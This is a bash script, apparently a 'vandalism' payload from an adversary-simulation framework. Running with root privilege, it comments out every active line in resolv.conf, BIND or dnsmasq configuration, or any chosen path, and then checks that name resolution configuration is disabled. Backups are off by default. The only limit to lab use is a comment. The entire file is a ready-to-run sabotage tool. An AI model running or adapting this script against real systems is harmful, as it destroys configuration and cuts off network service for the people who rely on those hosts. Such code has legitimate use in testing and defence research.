#!/usr/bin/env bash
#
# payloads/vandalism/dns_tamper/commands.sh
#
# Simulates DNS configuration vandalism by commenting out active lines in
# DNS-related configuration files without deleting the files.
#
# Intended only for local lab/VM environments under your control.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"
source "$FRAMEWORK_ROOT/lib/random_utils.sh"

require_privilege

TARGET_MODE="${TARGET_MODE:-resolv_conf}"

RESOLV_CONF_PATH="${RESOLV_CONF_PATH:-/etc/resolv.conf}"

BIND_PATH="${BIND_PATH:-/etc/bind}"

DNSMASQ_PATH="${DNSMASQ_PATH:-/etc/dnsmasq.d}"

TARGET_PATH="${TARGET_PATH:-}"

REQUIRE_PATH_EXISTS="${REQUIRE_PATH_EXISTS:-true}"

CREATE_BACKUP_BEFORE_TAMPER="${CREATE_BACKUP_BEFORE_TAMPER:-false}"

BACKUP_DIR="${BACKUP_DIR:-/var/tmp/aegis_backups}"

COMMENT_BLANK_LINES="${COMMENT_BLANK_LINES:-false}"

case "$TARGET_MODE" in

    resolv_conf)

        RESOLVED_TARGET="$RESOLV_CONF_PATH"
        ;;

    bind)

        RESOLVED_TARGET="$BIND_PATH"
        ;;

    dnsmasq)

        RESOLVED_TARGET="$DNSMASQ_PATH"
        ;;

    custom)

        [[ -n "$TARGET_PATH" ]] || \
            fail "TARGET_PATH must be set when TARGET_MODE=custom"

        RESOLVED_TARGET="$TARGET_PATH"
        ;;

    *)

        fail "Unsupported TARGET_MODE: $TARGET_MODE"
        ;;

esac

record_metadata "target_mode=$TARGET_MODE"
record_metadata "target_path=$RESOLVED_TARGET"

if [[ "$REQUIRE_PATH_EXISTS" == "true" ]]; then

    if ! run_priv "test -e '$RESOLVED_TARGET'"; then
        fail "Target path does not exist: $RESOLVED_TARGET"
    fi

fi

if run_priv "test -d '$RESOLVED_TARGET'"; then
    TARGET_KIND="directory"
elif run_priv "test -f '$RESOLVED_TARGET' -o -L '$RESOLVED_TARGET'"; then
    TARGET_KIND="file"
else
    fail "Target path is neither a file nor directory: $RESOLVED_TARGET"
fi

record_metadata "target_kind=$TARGET_KIND"

if run_priv "test -L '$RESOLVED_TARGET'"; then
    SYMLINK_TARGET="$(run_priv "readlink -f '$RESOLVED_TARGET'" || true)"
    record_metadata "target_symlink=true"
    record_metadata "target_realpath=${SYMLINK_TARGET:-unknown}"
else
    record_metadata "target_symlink=false"
fi

if [[ "$CREATE_BACKUP_BEFORE_TAMPER" == "true" ]]; then

    log "Creating backup before DNS tampering"

    BACKUP_SUFFIX="$(random_lower_string 6)"

    BACKUP_NAME="dns_tamper_backup_${BACKUP_SUFFIX}.tar.gz"

    BACKUP_PATH="${BACKUP_DIR}/${BACKUP_NAME}"

    run_priv "mkdir -p '$BACKUP_DIR'"

    run_priv "tar -czhf '$BACKUP_PATH' '$RESOLVED_TARGET'"

    record_metadata "backup_path=$BACKUP_PATH"

    log "Backup created: $BACKUP_PATH"

fi

if [[ "$COMMENT_BLANK_LINES" == "true" ]]; then
    SED_EXPR='/^[[:space:]]*#/!s/^/# /'
    VERIFY_EXPR='^[[:space:]]*[^#]'
else
    SED_EXPR='/^[[:space:]]*#/!{/^[[:space:]]*$/!s/^/# /}'
    VERIFY_EXPR='^[[:space:]]*[^#[:space:]]'
fi

log "Tampering DNS-related configuration"
log "Target mode: $TARGET_MODE"
log "Target path: $RESOLVED_TARGET"
log "Target kind: $TARGET_KIND"

if [[ "$TARGET_KIND" == "directory" ]]; then

    run_priv "find '$RESOLVED_TARGET' -type f -exec sed -i --follow-symlinks -e \"$SED_EXPR\" {} +"

    if run_priv "grep -RIlq '$VERIFY_EXPR' '$RESOLVED_TARGET'"; then
        fail "Tamper verification failed: active lines remain under $RESOLVED_TARGET"
    fi

else

    run_priv "sed -i --follow-symlinks -e \"$SED_EXPR\" '$RESOLVED_TARGET'"

    if run_priv "grep -Eq '$VERIFY_EXPR' '$RESOLVED_TARGET'"; then
        fail "Tamper verification failed: active lines remain in $RESOLVED_TARGET"
    fi

fi

record_metadata "tamper_success=true"

log "DNS tamper payload complete"
log "Tampered: $RESOLVED_TARGET"
